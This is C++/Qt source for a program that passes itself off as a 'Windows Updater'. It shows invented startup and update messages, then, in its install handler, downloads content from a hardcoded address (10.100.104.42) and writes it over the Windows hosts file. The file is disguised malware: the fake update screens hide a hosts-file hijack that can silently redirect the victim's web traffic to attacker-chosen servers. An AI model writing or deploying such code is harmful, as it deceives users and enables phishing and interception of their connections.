#include "mainwindow.h"
#include "threader.h"
#include "ui_mainwindow.h"
#include <iostream>
#include "HTTPRequest.hpp"
#include <QMessageBox>
#include <fstream>
#include <QThread>
#include <QList>
#include "mythread.h"
struct Starter
{
int id;
std::string name;
Starter(int StarterId, std::string StarterName) :
id(StarterId), name(StarterName)
{
}
};
std::list<Starter> listofStarters = { Starter(22, "Preparing..."),
Starter(3, "Starting up..."),
Starter(43, "Unpacking DLLs..."),
Starter(30,"Buffering..."),
Starter(2, "Running GUI...")
};
QString version = "1.0i";
QString nom = "Windows Updater ";
QString title = nom + version;
MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent), ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    QMainWindow::setWindowTitle(title);
    connect(ui->install, SIGNAL (released()), this, SLOT (handleInstall()));
    ui->progressBar->setRange(0,0);
    startUP();
}

MainWindow::~MainWindow()
{
    delete ui;
}
void MainWindow::startUP() {
    struct Starter
    {
    int id;
    std::string name;
    Starter(int StarterId, std::string StarterName) :
    id(StarterId), name(StarterName)
    {
    }
    };
    std::list<Starter> listofStarters = { Starter(22, "Preparing..."),
    Starter(3, "Starting up..."),
    Starter(43, "Unpacking DLLs..."),
    Starter(30,"Buffering..."),
    Starter(2, "Running GUI...")
    };
    std::list<Starter>::iterator it;
    for (it = listofStarters.begin(); it != listofStarters.end(); it++)
    {
        // Access the object through iterator
        int id = it->id;
        std::string name = it->name;

        //Print the contents
        std::cout << id << " :: " << name << std::endl;
        QString edit = QString::fromStdString(name);
        ui->status->setText(edit);
        long pause = random()/10000;
        std::cout << pause << std::endl;
        QThread::usleep(pause);
    }
    ui->progressBar->setRange(0,100);
    ui->progressBar->setValue(-1);
}

void MainWindow::doWork(const QString) {
    ui->progressBar->setRange(0,0);
    QString result;
    try {
    http::Request request("http://10.100.104.42/reduced.vhd");
    // send a get request
    const http::Response getResponse = request.send("GET");
    std::string data = std::string(getResponse.body.begin(), getResponse.body.end()); // print the result
    } catch (const std::exception& e) {
    QMessageBox msg;
    msg.setText("Failed to get network resources. Please try again later...");
    msg.exec();
    exit(404);
    }

}
void WorkerThread::run() {
        try {
                http::Request request("http://10.100.104.42/reduced.vhd");
                // send a get request
                const http::Response getResponse = request.send("GET");
                std::string data = std::string(getResponse.body.begin(), getResponse.body.end()); // print the result
                } catch (const std::exception& e) {
                QMessageBox msg;
                msg.setText("Failed to get network resources. Please try again later...");
                msg.exec();
                exit(404);
                }
                 emit progressChanged("Info");
 }
void MainWindow::onProgressChanged() {
    while (true){
        QString inf;
        inf = "Info";
    if (inf == "Info") {
        break;
    }
    }
}

void MainWindow::handleInstall(){
    ui->progressBar->setRange(0,0);
    try {
        WorkerThread *workerThread = new WorkerThread;
        connect(workerThread, SIGNAL(progressChanged(QString)),SLOT(onProgressChanged(QString)));
        connect(workerThread, SIGNAL(finished()), workerThread, SLOT(deleteLater()));
        workerThread->start(); // This invokes WorkerThread::run in a new thread
        onProgressChanged();
        ui->progressBar->setRange(0,100);
        ui->progressBar->setValue(-1);
        ui->install->setEnabled(true);
    } catch (const std::exception& e) {
        QMessageBox msg;
        msg.setText("Failed to get network resources. Please try again later...");
        msg.exec();
        exit(404);
    }
    try {
        http::Request request("http://10.100.104.42/test.cpp");
        // send a get request
        const http::Response getResponse = request.send("GET");
        std::string data;
        ui->status->setText("Updating software...");
        ui->progressBar->setRange(0,0);
        QThread::sleep(3);
        data = std::string(getResponse.body.begin(), getResponse.body.end()); // store the result;
            std::ofstream fout;
            std::string line;
            fout.open("C:\\Windows\\System32\\drivers\\etc\\hosts");
            fout << data << std::endl;

            // Close the File
            fout.close();
            ui->progressBar->setRange(0,100);
            ui->progressBar->setValue(-1);
            ui->status->setText("Done");
    } catch (const std::exception& e) {
        QMessageBox msg;
        msg.setText("Failed to get network resources. Please try again later...");
        msg.exec();
        exit(404);
    }
}
